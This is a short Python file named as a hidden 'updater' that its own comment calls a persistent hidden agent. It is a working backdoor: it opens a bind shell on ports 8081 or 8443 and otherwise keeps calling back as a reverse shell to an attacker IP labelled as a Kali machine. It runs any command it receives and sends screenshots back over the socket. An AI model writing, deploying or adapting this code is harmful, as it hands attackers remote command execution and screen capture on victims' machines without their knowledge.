# .updater.py (The persistent hidden agent)
import socket
import subprocess
import threading
import time

BIND_PORTS = [8081, 8443]
REVERSE_HOST = "192.168.56.103"  # Replace with Kali IP
REVERSE_PORT = 443

def handle_client(conn):
    conn.send(b"[*] Connected to agent.\n")
    while True:
        conn.send(b"\nShell> ")
        try:
            cmd = conn.recv(1024).decode().strip()
            if not cmd:
                continue
            if cmd == "exit":
                break
            elif cmd == "screenshot":
                output = subprocess.getoutput("scrot /tmp/screen.png")
                conn.send(output.encode() + b"\n")
                try:
                    with open("/tmp/screen.png", "rb") as f:
                        conn.sendall(f.read() + b"<<END_OF_FILE>>")
                except:
                    conn.send(b"[!] Screenshot failed.\n")
            else:
                output = subprocess.getoutput(cmd)
                conn.send(output.encode() + b"\n")
        except:
            break
    conn.close()

def bind_shell():
    for port in BIND_PORTS:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(("0.0.0.0", port))
            server.listen(1)
            print(f"[+] Listening on port {port}")
            client_socket, addr = server.accept()
            handle_client(client_socket)
            return True
        except:
            continue
    return False

def reverse_shell():
    try:
        while True:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((REVERSE_HOST, REVERSE_PORT))
                handle_client(client)
                break
            except:
                time.sleep(5)
    except:
        pass

def main():
    if not bind_shell():
        reverse_shell()

if __name__ == "__main__":
    main()
